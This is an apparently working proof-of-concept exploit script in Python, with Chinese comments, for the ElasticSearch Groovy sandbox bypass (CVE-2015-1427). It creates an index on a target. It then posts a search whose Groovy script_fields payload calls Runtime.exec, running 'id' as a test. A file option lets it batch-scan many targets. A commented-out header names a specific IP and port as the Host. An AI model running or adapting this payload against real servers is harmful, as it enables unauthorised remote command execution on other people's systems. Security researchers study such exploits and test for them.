'''
Author: twsec
Date: 2023-01-06 14:59:24
LastEditors: twsec
LastEditTime: 2023-12-20 10:59:14
Description: ElasticSearch Groovy 沙盒绕过 && 代码执行漏洞-POC
'''
import sys
import requests
import json
import time
import getopt
def usage():
    #生成一个图案
    print(''' 


████████╗██╗    ██╗███████╗███████╗ ██████╗
╚══██╔══╝██║    ██║██╔════╝██╔════╝██╔════╝
   ██║   ██║ █╗ ██║███████╗█████╗  ██║     
   ██║   ██║███╗██║╚════██║██╔══╝  ██║     
   ██║   ╚███╔███╔╝███████║███████╗╚██████╗
   ╚═╝    ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝
                                           

python3 CVE-2015-1427-POC.py -t url / -f file
-u url: 目标地址
-f file: 批量检测
-h help: 帮助
想念你的时候，我会用你的名字喊醒自己。
''')

def creat(target):
    url = target + "/test/test/"
    #print(url)
    #headers = {"Accept":"*/*","Accept-Language":"en","Connection":"close","Content-Length":"25","Content-Type":"application/x-www-form-urlencoded","Host":"139.5.200.26:45384","User-Agent":"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"}
    res = requests.post(url=url,  data=json.dumps({
  "name": "test"
}

), verify=False)
    return res.status_code


def cheak(target):
    url = target + "/_search?pretty"    
    #headers = {"Accept":"*/*","Accept-Language":"en","Connection":"close","Content-Length":"343","Content-Type":"application/x-www-form-urlencoded","Host":"139.5.200.26:45384","User-Agent":"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"}
    
    for i in range(5):
        try:
            res = requests.post(url=url,  data=json.dumps({"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}), verify=False)
            
            if res.status_code == 200:
                return res.text
                #print(res.text)
        except requests.exceptions.RequestException as e:
            print(f"Attempt {i+1} failed, retrying in 1 second...")
            time.sleep(1)
    
    return res.text

def create_and_check(target):
    code = creat(target)
    if code == 201:
        print("创建成功！")
        res = cheak(target)
        if res:
            if "uid" in res and "gid" in res:
                print(target + "存在ElasticSearch Groovy 沙盒绕过 && 代码执行漏洞！")
            else:
                print("执行失败！" + target + "可能不存在ElasticSearch Groovy 沙盒绕过 && 代码执行漏洞！")
            print("执行结果为：" + res)
        else:
            print("执行失败！可能不存在ElasticSearch Groovy 沙盒绕过 && 代码执行漏洞！")

    else:
        print("创建失败,漏洞可能不存在！")

#main函数

if __name__ == '__main__':
    usage()
    try:

        opts, args = getopt.getopt(sys.argv[1:], "ht:f:")
    except getopt.GetoptError:
        print('python3 CVE-2015-1427-POC.py -t url / -f file')
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h' or opt == '--help':
            print('python3 CVE-2015-1427-POC.py -t url / -f file')
            sys.exit()

        if opt == '-t' or opt == '--target':
            target = arg
            #print(target)
            create_and_check(target)
            sys.exit()
        if opt == '-f' or opt == '--file':
            file = arg
            with open(file, 'r') as f:
                for line in f.readlines():
                    target = line.strip()
                    print(target)
                    create_and_check(target)
                    #sys.exit()